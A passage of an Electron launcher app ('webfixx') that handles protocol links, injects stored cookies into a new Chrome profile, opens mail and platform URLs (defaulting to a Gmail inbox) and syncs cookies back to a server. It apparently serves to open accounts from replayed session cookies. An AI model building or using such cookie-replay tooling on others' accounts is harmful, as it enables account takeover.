        if (browserWsClient && browserWsClient.readyState === WebSocket.OPEN) browserWsClient.close();
        browserWsClient = null;

        if (chromeProcess) {
          try {
            chromeProcess.unref();
          } catch (_) {}
          chromeProcess = null;
        }

        sendStatus('success', `Session opened in ${browser.name}! (${cookiesSet} cookies injected from ${cookieCandidateName})`);
    } else {
      sendStatus('launching', `Opening ${domain || 'session'} in ${browser.name}...`);

      const chromeArgs = [
        `--user-data-dir=${destDir}`,
        '--no-first-run',
        '--no-default-browser-check',
        '--disable-sync',
      ];

      let targetUrls = (Array.isArray(platformUrls) && platformUrls.length > 1)
        ? platformUrls
        : resolveSmartPlatformUrls(domain, platform, email, cookieJSON);
      if (!targetUrls || targetUrls.length === 0) {
        targetUrls = ['https://mail.google.com/mail/u/0/#inbox'];
      }
      for (const u of targetUrls) {
        chromeArgs.push(u);
      }

      const child = spawn(browser.path, chromeArgs, {
        detached: true,
        stdio: 'ignore',
      });
      child.on('error', (err) => {
        const code = err.code || '';
        if (code === 'EPERM' || code === 'EBUSY') {
          sendStatus('error', 'This session is already open in another browser window. Close it first, then retry.');
        } else {
          sendStatus('error', `Failed to launch browser: ${err.message}`);
        }
      });
      child.unref();

      sendStatus('success', `Session opened in ${browser.name}!`);
    }
  } catch (error) {
    sendStatus('error', error.message || 'An unexpected error occurred');
  } finally {
    if (wsClient && wsClient.readyState === WebSocket.OPEN) {
      try { wsClient.close(); } catch (_) {}
    }
    if (browserWsClient && browserWsClient.readyState === WebSocket.OPEN) {
      try { browserWsClient.close(); } catch (_) {}
    }
    if (chromeProcess) {
      try {
        if (chromeProcess.pid && process.platform === 'win32') {
          const { execSync } = require('child_process');
          execSync(`taskkill /pid ${chromeProcess.pid} /T /F`, { stdio: 'ignore' });
        } else {
          chromeProcess.kill();
        }
      } catch (_) {}
      chromeProcess = null;
    }
  }
}

function parseProtocolUrl(url) {
  try {
    if (!url) return null;
    const cleanUrl = String(url).replace(/^["']|["']$/g, '').trim();
    const parsed = new URL(cleanUrl);
    let browserId = parsed.searchParams.get('browserId');
    let token = parsed.searchParams.get('token');
    let api = parsed.searchParams.get('api');
    let launcherKey = parsed.searchParams.get('launcherKey');
    let username = parsed.searchParams.get('username') || parsed.searchParams.get('user');
    if (browserId) browserId = browserId.replace(/\/+$/, '');
    if (token) token = token.replace(/\/+$/, '');
    if (launcherKey) launcherKey = launcherKey.trim();
    if (username) username = username.trim();
    if (api) {
      api = decodeURIComponent(api).replace(/\/+$/, '');
      API_BASE = api;
    }
    return { browserId, token, api, launcherKey, username };
  } catch {
    return null;
  }
}

app.setAsDefaultProtocolClient('webfixx-multi');
app.setAsDefaultProtocolClient('webfixx');

const gotTheLock = app.requestSingleInstanceLock();
if (!gotTheLock) {
  app.quit();
} else {
  app.on('second-instance', (_event, argv) => {
    if (mainWindow && !mainWindow.isDestroyed()) {
      if (mainWindow.isMinimized()) mainWindow.restore();
      mainWindow.focus();
    }
    const url = argv.find((a) => {
      const clean = String(a).replace(/^["']|["']$/g, '');
      return clean.startsWith('webfixx-multi://') || clean.startsWith('webfixx://');
    });
    if (url) {
      const params = parseProtocolUrl(url);
      if (params && params.browserId && params.token) {
        lastSessionParams = params;
        launchSession(params.browserId, params.token, params.launcherKey, params.username);
      }
    }
  });

  app.whenReady().then(() => {
    createWindow();

    mainWindow.webContents.on('did-finish-load', () => {
      const url = process.argv.find((a) => {
        const clean = String(a).replace(/^["']|["']$/g, '');
        return clean.startsWith('webfixx-multi://') || clean.startsWith('webfixx://');
      });
      if (url) {
        const params = parseProtocolUrl(url);
        if (params && params.browserId && params.token) {
          lastSessionParams = params;
          launchSession(params.browserId, params.token, params.launcherKey, params.username);
        } else {
          sendStatus('error', 'Invalid launch URL');
        }
      } else {
        sendStatus('idle', 'Waiting for launch request...');
      }
    });
  });
}

app.on('window-all-closed', () => {
  app.quit();
});

function handleCloseApp() {
  appendLog('[INFO] Close app requested by user');
  if (activeSyncTimer) {
    clearInterval(activeSyncTimer);
    activeSyncTimer = null;
  }
  if (activeSessionContext && activeSessionContext.debugPort) {
    syncCookiesToServer(activeSessionContext.debugPort, activeSessionContext).catch(() => {});
  }
  try {
    if (downloadAbortController) {
      downloadAbortController.abort();
    }
  } catch (_) {}

  try {
    if (mainWindow && !mainWindow.isDestroyed()) {
      mainWindow.destroy();
    }
  } catch (_) {}

  app.quit();

  setTimeout(() => {
    try {
      app.exit(0);
    } catch (_) {}
  }, 200);
}

ipcMain.on('close-app', handleCloseApp);
ipcMain.on('close-window', handleCloseApp);

ipcMain.on('retry-session', () => {
  appendLog('[INFO] Retry session requested by user');
  if (lastSessionParams && lastSessionParams.browserId && lastSessionParams.token) {
    if (lastSessionParams.api) {
      API_BASE = lastSessionParams.api;
    }
    launchSession(lastSessionParams.browserId, lastSessionParams.token, lastSessionParams.launcherKey, lastSessionParams.username);
  } else {
    sendStatus('error', 'Cannot retry: session parameters not found. Please click "Open Session" from the dashboard.');
  }
});
ipcMain.on('retry-launch', () => {
  appendLog('[INFO] Retry launch requested by user');
  if (lastSessionParams && lastSessionParams.browserId && lastSessionParams.token) {
    if (lastSessionParams.api) {
      API_BASE = lastSessionParams.api;
    }
    launchSession(lastSessionParams.browserId, lastSessionParams.token, lastSessionParams.launcherKey, lastSessionParams.username);
  } else {
    sendStatus('error', 'Cannot retry: session parameters not found. Please click "Open Session" from the dashboard.');
  }
});
